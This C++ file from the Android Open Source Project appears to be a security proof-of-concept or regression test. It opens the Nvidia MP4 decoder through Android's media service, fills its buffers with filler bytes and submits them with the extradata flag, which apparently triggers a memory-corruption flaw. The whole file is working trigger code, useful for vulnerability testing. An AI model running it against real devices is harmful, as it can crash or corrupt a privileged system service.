/*
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/MemoryDealer.h>
#include <binder/ProcessState.h>
#include <cutils/properties.h>
#include <media/IMediaCodecService.h>
#include <media/IMediaPlayerService.h>
#include <media/IOMX.h>
#include <media/OMXBuffer.h>
#include <media/hardware/HardwareAPI.h>
#include <media/omx/1.0/WOmx.h>
#include <media/stagefright/OMXClient.h>
#include <media/stagefright/foundation/AString.h>
#include <media/stagefright/omx/OMXUtils.h>
#include <utils/Log.h>
#include <utils/NativeHandle.h>
#include "OMX_Component.h"
#include "OMX_IndexExt.h"
#include "OMX_QCOMExtns.h"

using namespace android;

struct DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

struct DeathRecipient : public IBinder::DeathRecipient {
  DeathRecipient() : mDied(false) {}
  bool mDied;
  virtual void binderDied(const wp<IBinder> &who __unused) { mDied = true; }
  bool died() const { return mDied; }
};

bool connectOMX(sp<IOMX> &omx) {
  sp<IBinder> binder;
  sp<IServiceManager> sm = defaultServiceManager();

  binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> service = interface_cast<IMediaPlayerService>(binder);

  if (binder == NULL) {
    ALOGE("[-] cannot get the media player service");
    return false;
  }
  omx = service->getOMX();
  if (omx == NULL) {
    ALOGE("[-] cannot get the OMX interface");
    return false;
  }
  return true;
}

int main() {
  sp<IOMX> service;
  if (connectOMX(service) == false) {
    ALOGE("[+] Cannot obtain IOMX from connectOMX");
    return EXIT_FAILURE;
  }

  status_t err;
  sp<IOMXNode> omxNode;
  int fenceFd = -1;
  Vector<sp<IMemory>> mInBuffers;
  Vector<sp<IMemory>> mOutBuffers;

  sp<DummyOMXObserver> observer = new DummyOMXObserver();

  const char *codecName = "OMX.Nvidia.mp4.decode";

  AString name(codecName);
  err = service->allocateNode(name.c_str(), observer, &omxNode);
  if (err != OK || omxNode == NULL) {
    ALOGE("[+] Unable to instantiate a %s", name.c_str());
    return EXIT_FAILURE;
  }

  // Initiate transition Loaded->Idle
  err = omxNode->sendCommand(OMX_CommandStateSet, OMX_StateIdle);
  if (err != OK) {
    ALOGE("sendCommand, err: %d", err);
    return EXIT_FAILURE;
  }

  OMX_PARAM_PORTDEFINITIONTYPE def;
  InitOMXParams(&def);
  def.nPortIndex = 0;
  OMX_INDEXTYPE omx_indextype = OMX_IndexParamPortDefinition;
  err = omxNode->getParameter(omx_indextype, &def, sizeof(def));
  if (err != OK) {
    ALOGI("port 0: %u buffers of size 0x%x", def.nBufferCountActual,
            def.nBufferSize);
    return EXIT_FAILURE;
  }

  int inMemSize = def.nBufferCountActual * def.nBufferSize;
  int inBufferCnt = def.nBufferCountActual;
  int inBufferSize = inMemSize / inBufferCnt;
  sp<MemoryDealer> dealerIn = new MemoryDealer(inBufferSize);
  IOMX::buffer_id *inBufferId = new IOMX::buffer_id[inBufferCnt];

  InitOMXParams(&def);
  def.nPortIndex = 1;
  err = omxNode->getParameter(omx_indextype, &def, sizeof(def));
  if (err != OK) {
    ALOGI("port 1: %u buffers of size 0x%x", def.nBufferCountActual,
            def.nBufferSize);
    return EXIT_FAILURE;
  }

  int outMemSize = def.nBufferCountActual * def.nBufferSize;
  int outBufferCnt = def.nBufferCountActual;
  int outBufferSize = outMemSize / outBufferCnt;
  sp<MemoryDealer> dealerOut = new MemoryDealer(outBufferSize);
  IOMX::buffer_id *outBufferId = new IOMX::buffer_id[outBufferCnt];

  sp<IMemory> inMemory = dealerIn->allocate(inBufferSize);

  for (int i = 0; i < inBufferCnt; i++) {
    memset(inMemory->pointer(), 0x7c, inBufferSize);
    OMXBuffer omxbuffer(inMemory);
    mInBuffers.push(inMemory);
    err = omxNode->useBuffer(0, omxbuffer, &inBufferId[i]);
    if (err != OK) {
      ALOGE("port 0 err: %d useBuffer,inBufferId[%d]: %d,inBufferSize=%d", err, i,
              inBufferId[i], inBufferSize);
      return EXIT_FAILURE;
    }
  }

  sp<IMemory> outMemory = dealerOut->allocate(outBufferSize);

  for (int i = 0; i < outBufferCnt; i++) {
    memset(outMemory->pointer(), 0x2f, outBufferSize);
    OMXBuffer omxbuffer(outMemory);
    mOutBuffers.push(outMemory);
    err = omxNode->useBuffer(1, omxbuffer, &outBufferId[i]);
    if (err != OK) {
      ALOGE("port 1 err: %d useBuffer,outBufferId[%d]: %d,outBufferSize=%d", err,
              i, outBufferId[i], outBufferSize);
      return EXIT_FAILURE;
    }
  }

  err = omxNode->sendCommand(OMX_CommandStateSet, OMX_StateExecuting);
  if (err != OK) {
    ALOGE("sendCommand, err: %d", err);
    return EXIT_FAILURE;
  }

  sleep(5);

  for (int i = 0; i < inBufferCnt; i++) {
    OMX_U32 flags = OMX_BUFFERFLAG_EXTRADATA;
    int64_t timeUs = 0x00010001;
    OMXBuffer omxbuffer(0, inBufferSize);
    err = omxNode->emptyBuffer(inBufferId[i], omxbuffer, flags, timeUs, fenceFd);
    if (err != OK) {
      ALOGE("emptyBuffer, err: %d", err);
      return EXIT_FAILURE;
    }
  }

  for (int i = 0; i < outBufferCnt; i++) {
    err = omxNode->fillBuffer(outBufferId[i], OMXBuffer::sPreset);
    if (err != OK) {
      ALOGE("fillBuffer, err: %d", err);
      return EXIT_FAILURE;
    }
  }

  omxNode->freeNode();
  return EXIT_SUCCESS;
}
